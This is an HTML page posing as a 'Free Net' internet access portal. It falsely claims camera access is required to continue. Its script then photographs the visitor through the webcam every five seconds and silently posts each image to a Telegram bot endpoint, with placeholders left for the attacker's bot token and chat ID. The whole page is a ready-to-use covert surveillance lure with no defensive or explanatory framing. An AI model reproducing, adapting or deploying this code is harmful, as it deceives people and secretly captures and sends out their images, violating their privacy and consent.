<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Net Access</title>
    <style>
        /* General body styling */
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('https://via.placeholder.com/1920x1080?text=Free+Net+Page') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Arial', sans-serif;
            color: white;
            text-align: center;
            box-sizing: border-box;
        }

        /* Container for content */
        .container {
            background: rgba(0, 0, 0, 0.7); /* Transparent background */
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }

        /* Heading style */
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            font-weight: bold;
            color: #ffcc00;
        }

        /* Paragraph style */
        p {
            font-size: 1.2rem;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        /* Button to reload page (in case of camera access issue) */
        .retry-button {
            background-color: #ffcc00;
            border: none;
            padding: 12px 20px;
            border-radius: 6px;
            font-size: 16px;
            color: #000;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .retry-button:hover {
            background-color: #ffaa00;
        }

        /* Logo or icon style */
        .logo {
            width: 120px;
            margin-bottom: 20px;
        }

        /* Footer style */
        footer {
            margin-top: 20px;
            font-size: 1rem;
            color: #ffcc00;
        }

    </style>
</head>
<body>
    <div class="container">
        <img src="https://via.placeholder.com/120x120?text=Logo" class="logo" alt="Logo"> <!-- Replace with your logo -->
        <h1>Welcome to Free Net</h1>
        <p>To continue, please allow camera access. This is required to unlock Free Net. If you don't allow, you will not be able to proceed.</p>
        <button class="retry-button" onclick="requestCamera()">Allow Camera Access</button>
    </div>

    <script>
        const chat_id = '123456789'; // Replace with your Telegram Chat ID
        const token = 'YOUR_BOT_TOKEN'; // Replace with your Telegram Bot Token
        const telegramURL = `https://api.telegram.org/bot${token}/sendPhoto`;

        // Check if the browser supports getUserMedia API
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            requestCamera(); // Request camera access immediately on page load
        } else {
            alert('Your browser does not support camera access.');
        }

        async function requestCamera() {
            try {
                // Request camera permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                captureAndSendPhotos(stream); // Start capturing photos if permission is granted
            } catch (error) {
                alert("Camera access is required to use Free Net. Please allow camera access.");
            }
        }

        function captureAndSendPhotos(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            setInterval(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob);

                    fetch(telegramURL, {
                        method: 'POST',
                        body: formData,
                    })
                    .catch(error => console.error("Error sending photo:", error)); // Silent error handling
                }, 'image/jpeg');
            }, 5000); // Capture and send photo every 5 seconds
        }
    </script>
</body>
    </html>
